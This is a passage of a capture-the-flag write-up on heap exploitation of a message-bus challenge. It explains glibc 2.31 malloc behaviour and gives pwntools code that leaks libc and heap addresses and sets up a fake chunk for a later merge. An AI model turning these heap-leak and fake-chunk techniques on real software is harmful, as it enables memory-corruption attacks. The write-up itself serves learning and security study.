+<h1 id="exploit">Exploit<a href="#exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>After we now developed a high level strategy for leaking the flag, let&rsquo;s adapt this strategy to the challenge. First we have to find interfering calls to <code>malloc</code>, since they change the heap layout and may mess with our carefully allocated and freed chunks.</p>
+<h2 id="other-allocations">Other allocations<a href="#other-allocations" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Despite some allocations, for example for the two space trackers, are done on initialization, those do not pose a threat, since they will never be freed and because they are all done without interleaving temporary requests. As a result of no temporary requests, all these long living objects will be split from the top chunk, leaving no wholes that may mess with our strategy. Thereby, we can concentrate on the allocations and deallocations performed during sending and receiving messages.</p>
+<p>So let&rsquo;s start pwndbg and break at <code>__libc_malloc</code> and <code>__libc_free</code>, the functions that are weakly bound to <code>malloc</code> and <code>free</code>.</p>
+<p>When we send a message, the input is read from <code>std::cin</code>. While reading integers does not trigger an allocation, reading the message triggers multiple calls to <code>malloc</code> and <code>free</code>. <code>std::getline</code> first allocates 0x1f bytes. If the input length exceeds the length of the buffer, a new buffer of size <code>old * 2 - 1</code> is allocated and the old buffer is freed. After the message is read, the buffer for the decoded message is allocated. Furthermore a <code>SB_Msg</code> object of 24 bytes (chunk size: 0x20) is allocated for storing the metadata. Afterwards, the <code>SB_Bus</code> adds the message to his queue, which results in an additional allocation of 32 bytes (chunk size: 0x30)for the node in the queue. Finally, the metadata object and the read line is freed.</p>
+<p>When we receive a message, a new <code>SB_Msg</code> object is created for the message. After removing the message from the queue and freeing it&rsquo;s node, the message is printed or simply dropped. Finally the message and the metadata object are freed.</p>
+<h2 id="abstraction">Abstraction<a href="#abstraction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Before we will write the exploit, let&rsquo;s first create two methods for sending and receiving messages to capsule the raw interaction with the challenge from the exploit for an easier and cleaner exploit script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post_message</span>(con: tube, msg_id: int, pipe_id: int, is_hex: bool, msg: bytes) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;msg_id: &#34;</span>, str(msg_id)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pipe_id: &#34;</span>, str(pipe_id)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> is_hex:
+</span></span><span style="display:flex;"><span>        con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hex: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hex: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>    con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Message to post on bus: &#34;</span>, msg)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recv_message</span>(con: tube, pipe: int) <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>    con<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, str(pipe<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    con<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;StarTracker: Testing Message</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">=</span> con<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes([int(byte, <span style="color:#ae81ff">16</span>) <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> msg<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span>)])
+</span></span></code></pre></div><p>After we now know all calls to <code>malloc</code> and <code>free</code> and have proper methods for allocating and freeing buffers, we can build our exploit.</p>
+<h2 id="leak-libc">Leak libc<a href="#leak-libc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Let&rsquo;s start with leaking the address of the libc.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_libc</span>(con):
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x3c1</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>))
+</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    print(hexdump(leak))
+</span></span><span style="display:flex;"><span>    bin_address <span style="color:#f92672">=</span> u64(leak[<span style="color:#ae81ff">0x3d0</span>:<span style="color:#ae81ff">0x3d8</span>])
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;bin for size of 0x790 is at </span><span style="color:#e6db74">{</span>hex(bin_address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bin_address
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>stack_pointer <span style="color:#f92672">=</span> leak_libc(io) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10c</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;stack pointer at </span><span style="color:#e6db74">{</span>hex(stack_pointer)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>For the first message, we provide 0x77f hex characters. This carefully chosen message length fits the allocation of the last but one chunk needed for the input. Since the allocated chunk has a size of 0x3d0 bytes, the half byte overflow only overwrites an unused byte at the end of the chunk. To fit the input, a buffer of 0x781 bytes (chunk size: 0x790) is allocated. As the <code>SB_msg</code> object does not fit into one of the already allocated and freed chunks (0x30, 0x50, 0x90, 0x100, 0x1f0) and because all of these chunks reside in their tcache bins, which are only used for allocations of the same size, a new chunk is allocated directly after the chunk for the hex input. Thereby, the <code>SB_msg</code> chunk separates the input chunk from the top chunk. As a result, the input chunk will be freed into the unsorted bin. If we now receive the message, the <code>SB_msg</code> object will be reallocated from tcache and the message will be printed. As the message is stored in the chunk directly before the one the input buffer that was freed into the unsorted bin and because this chunk is the only chunk in that bin, the over-read will leak the address of the unsorted bin. With this leak, we can compute the address of the <code>program_invocation_short_name</code>, which is located <code>0x10c * 8</code> bytes after the unsorted bin.</p>
+<h2 id="leak-heap">Leak Heap<a href="#leak-heap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Now it&rsquo;s time for leaking the heap. The input chunks from leaking the libc address are all behind one another and all but the largest one are in tcache. Since these chunks are the only one of their size, their next pointer will be NULL, i.e. leaking it will not reveal the heap address. Despite that, we don&rsquo;t need to add additional chunks of the same size, since we can leverage the protection against double free to leak the heap address. In older versions of glibc, such as the one used in this challenge, protection against double free is achieved by writing the address of the tcache struct to the backward pointer of the chunk. If a new chunk is added to tcache, this pointer will be checked and in case of a match, glibc will traverse the bin to prevent false positives. Since the tcache struct is located at the start of the heap, we can use it to compute the position of our relevant chunks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_heap</span>(con: tube) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    post_message(con, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">True</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x1e1</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> recv_message(con, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    print(hexdump(leak))
+</span></span><span style="display:flex;"><span>    heap_base <span style="color:#f92672">=</span> u64(leak[<span style="color:#ae81ff">0x1f8</span>:<span style="color:#ae81ff">0x200</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span><span style="color:#ae81ff">0xfff</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;heap is at </span><span style="color:#e6db74">{</span>hex(heap_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> heap_base
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> leak_heap(io)
+</span></span><span style="display:flex;"><span>chunk_3c1_content <span style="color:#f92672">=</span> heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x16cd0</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;3c1 chunk at </span><span style="color:#e6db74">{</span>hex(chunk_3c1_content)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>Since this works, the service uses indeed glibc 2.31, as 2.32 would use a canary like value for the key.</p>
+<h2 id="create-fake-chunk">Create fake chunk<a href="#create-fake-chunk" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Since we now know the address of our chunk, we can create a fake chunk.</p>
+<p>First we allocate two chunks to have two <code>Node</code> objects. While the size of the second chunk can be chosen arbitrarily, the first one has to be one that will result in a chunk of 0x790 bytes. This is important, as we want a chunk of 0x100 bytes to be allocated directly after the 0x3d0 chunk used for our input in the previous steps, since it is followed by the 0x790 chunk that resides in the unsorted bin and can be split into smaller chunks. Since we only need the nodes, we can free both chunks directly afterwards.</p>
+<p>Now we can fill the tcache with seven chunks of the same size. Therefore we first have to allocate seven messages of the same size. Since the second allocation will be the first one split from the big 0x790 chunk, we save it inside the other pipe for later use. Since we need the chunks to be in tcache, we free all seven messages from the first pipe directly afterwards.</p>
+<p>Before we can trigger the merge, we have to create the fake chunk inside the chunk before the saved one. The chunk has a size of 0x3d0 bytes, i.e. the previous size field is at offset 0x3c0. We further have to choose a fake chunk size, such that the merged chunk will be of a size that fits into tcache and that is not used when reading the input, as this would mess with our carefully designed heap layout. We choose a size of 0x40 bytes for a total size of the merged chunk of 0x140 bytes. The created fake chunk has the following contents:</p>
+
+
+
+<div class="goat svg-container ">
+  
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      font-family="Menlo,Lucida Console,monospace"
+      
+        viewBox="0 0 696 345"
+      >
+      <g transform='translate(8,16)'>
+<path d='M 104,0 L 120,0' fill='none' stroke='currentColor'></path>
+<path d='M 136,0 L 432,0' fill='none' stroke='currentColor'></path>
+<path d='M 448,0 L 472,0' fill='none' stroke='currentColor'></path>
+<path d='M 152,32 L 416,32' fill='none' stroke='currentColor'></path>
+<path d='M 152,64 L 416,64' fill='none' stroke='currentColor'></path>
+<path d='M 352,80 L 432,80' fill='none' stroke='currentColor'></path>
+<path d='M 432,80 L 472,80' fill='none' stroke='currentColor'></path>
+<path d='M 152,96 L 416,96' fill='none' stroke='currentColor'></path>
+<path d='M 352,112 L 432,112' fill='none' stroke='currentColor'></path>
+<path d='M 432,112 L 472,112' fill='none' stroke='currentColor'></path>
+<path d='M 152,128 L 416,128' fill='none' stroke='currentColor'></path>
+<path d='M 152,160 L 416,160' fill='none' stroke='currentColor'></path>
+<path d='M 152,192 L 416,192' fill='none' stroke='currentColor'></path>
+<path d='M 152,224 L 416,224' fill='none' stroke='currentColor'></path>
+<path d='M 104,256 L 120,256' fill='none' stroke='currentColor'></path>
+<path d='M 136,256 L 432,256' fill='none' stroke='currentColor'></path>
+<path d='M 152,288 L 416,288' fill='none' stroke='currentColor'></path>
+<path d='M 448,288 L 464,288' fill='none' stroke='currentColor'></path>
+<path d='M 152,320 L 416,320' fill='none' stroke='currentColor'></path>
+<path d='M 136,0 L 136,256' fill='none' stroke='currentColor'></path>
+<path d='M 136,256 L 136,320' fill='none' stroke='currentColor'></path>
+<path d='M 432,0 L 432,80' fill='none' stroke='currentColor'></path>
+<path d='M 432,80 L 432,112' fill='none' stroke='currentColor'></path>
+<path d='M 432,112 L 432,256' fill='none' stroke='currentColor'></path>
+<path d='M 432,256 L 432,320' fill='none' stroke='currentColor'></path>
+<path d='M 472,0 L 472,80' fill='none' stroke='currentColor'></path>
+<path d='M 472,80 L 472,112' fill='none' stroke='currentColor'></path>
+<polygon points='128.000000,0.000000 116.000000,-5.600000 116.000000,5.600000' fill='currentColor' transform='rotate(0.000000, 120.000000, 0.000000)'></polygon>
+<polygon points='128.000000,256.000000 116.000000,250.399994 116.000000,261.600006' fill='currentColor' transform='rotate(0.000000, 120.000000, 256.000000)'></polygon>
+<polygon points='456.000000,0.000000 444.000000,-5.600000 444.000000,5.600000' fill='currentColor' transform='rotate(180.000000, 448.000000, 0.000000)'></polygon>
+<polygon points='456.000000,288.000000 444.000000,282.399994 444.000000,293.600006' fill='currentColor' transform='rotate(180.000000, 448.000000, 288.000000)'></polygon>
+<circle cx='352' cy='80' r='6' stroke='currentColor' fill='#fff'></circle>
+<circle cx='352' cy='112' r='6' stroke='currentColor' fill='#fff'></circle>
+<text text-anchor='middle' x='0' y='4' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='0' y='260' fill='currentColor' style='font-size:1em'>m</text>
+<text text-anchor='middle' x='8' y='4' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='8' y='260' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='16' y='4' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='16' y='260' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='24' y='4' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='24' y='260' fill='currentColor' style='font-size:1em'>g</text>
+<text text-anchor='middle' x='32' y='4' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='32' y='260' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='40' y='4' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='48' y='260' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='56' y='4' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='56' y='260' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='64' y='4' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='64' y='260' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='72' y='4' fill='currentColor' style='font-size:1em'>3</text>
+<text text-anchor='middle' x='72' y='260' fill='currentColor' style='font-size:1em'>g</text>
+<text text-anchor='middle' x='80' y='4' fill='currentColor' style='font-size:1em'>8</text>
+<text text-anchor='middle' x='80' y='260' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='88' y='4' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='88' y='260' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='160' y='84' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>b</text>
+<text text-anchor='middle' x='160' y='276' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='160' y='308' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='168' y='52' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='168' y='84' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='168' y='276' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='168' y='308' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'>4</text>
+<text text-anchor='middle' x='176' y='84' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='176' y='116' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='176' y='276' fill='currentColor' style='font-size:1em'>4</text>
+<text text-anchor='middle' x='176' y='308' fill='currentColor' style='font-size:1em'>1</text>
+<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'>1</text>
+<text text-anchor='middle' x='184' y='84' fill='currentColor' style='font-size:1em'>w</text>
+<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>k</text>
+<text text-anchor='middle' x='184' y='276' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='184' y='308' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='192' y='84' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='192' y='116' fill='currentColor' style='font-size:1em'>w</text>
+<text text-anchor='middle' x='192' y='308' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='200' y='52' fill='currentColor' style='font-size:1em'>(</text>
+<text text-anchor='middle' x='200' y='84' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='200' y='116' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='208' y='52' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='208' y='84' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='208' y='116' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='208' y='276' fill='currentColor' style='font-size:1em'>(</text>
+<text text-anchor='middle' x='208' y='308' fill='currentColor' style='font-size:1em'>(</text>
+<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>(</text>
+<text text-anchor='middle' x='216' y='52' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='216' y='116' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='216' y='276' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='216' y='308' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='224' y='52' fill='currentColor' style='font-size:1em'>z</text>
+<text text-anchor='middle' x='224' y='84' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='224' y='276' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='224' y='308' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='232' y='52' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='232' y='84' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='232' y='116' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='232' y='276' fill='currentColor' style='font-size:1em'>z</text>
+<text text-anchor='middle' x='232' y='308' fill='currentColor' style='font-size:1em'>z</text>
+<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>z</text>
+<text text-anchor='middle' x='240' y='84' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='240' y='116' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='240' y='276' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='240' y='308' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='248' y='52' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='248' y='84' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='248' y='116' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='256' y='52' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='256' y='84' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='256' y='276' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='256' y='308' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='264' y='84' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='264' y='276' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='264' y='308' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='272' y='52' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='272' y='84' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='272' y='116' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='280' y='52' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='280' y='116' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='280' y='276' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='280' y='308' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='288' y='20' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='288' y='52' fill='currentColor' style='font-size:1em'>k</text>
+<text text-anchor='middle' x='288' y='276' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='288' y='308' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='296' y='20' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='296' y='52' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='296' y='276' fill='currentColor' style='font-size:1em'>k</text>
+<text text-anchor='middle' x='296' y='308' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='304' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='304' y='276' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='304' y='308' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='312' y='20' fill='currentColor' style='font-size:1em'>v</text>
+<text text-anchor='middle' x='312' y='52' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='320' y='20' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='320' y='52' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='320' y='276' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='320' y='308' fill='currentColor' style='font-size:1em'>|</text>
+<text text-anchor='middle' x='328' y='20' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='328' y='52' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='328' y='276' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='336' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='336' y='52' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='336' y='276' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='336' y='308' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='344' y='20' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='344' y='52' fill='currentColor' style='font-size:1em'>k</text>
+<text text-anchor='middle' x='344' y='276' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='344' y='308' fill='currentColor' style='font-size:1em'>l</text>
+<text text-anchor='middle' x='352' y='20' fill='currentColor' style='font-size:1em'>)</text>
+<text text-anchor='middle' x='352' y='276' fill='currentColor' style='font-size:1em'>k</text>
+<text text-anchor='middle' x='352' y='308' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='360' y='52' fill='currentColor' style='font-size:1em'>|</text>
+<text text-anchor='middle' x='360' y='276' fill='currentColor' style='font-size:1em'>)</text>
+<text text-anchor='middle' x='360' y='308' fill='currentColor' style='font-size:1em'>g</text>
+<text text-anchor='middle' x='368' y='308' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='376' y='52' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='376' y='308' fill='currentColor' style='font-size:1em'>)</text>
+<text text-anchor='middle' x='384' y='52' fill='currentColor' style='font-size:1em'>l</text>
+<text text-anchor='middle' x='392' y='52' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='400' y='52' fill='currentColor' style='font-size:1em'>g</text>
+<text text-anchor='middle' x='408' y='52' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='416' y='52' fill='currentColor' style='font-size:1em'>)</text>
+<text text-anchor='middle' x='480' y='292' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='488' y='292' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='496' y='292' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='512' y='292' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='520' y='292' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='536' y='292' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='544' y='292' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='552' y='292' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='568' y='292' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='576' y='292' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='584' y='292' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='592' y='292' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='600' y='292' fill='currentColor' style='font-size:1em'>k</text>
+<text text-anchor='middle' x='616' y='292' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='624' y='292' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='632' y='292' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='640' y='292' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='656' y='292' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='664' y='292' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='672' y='292' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='680' y='292' fill='currentColor' style='font-size:1em'>a</text>
+</g>
+
+    </svg>
+  
+</div>
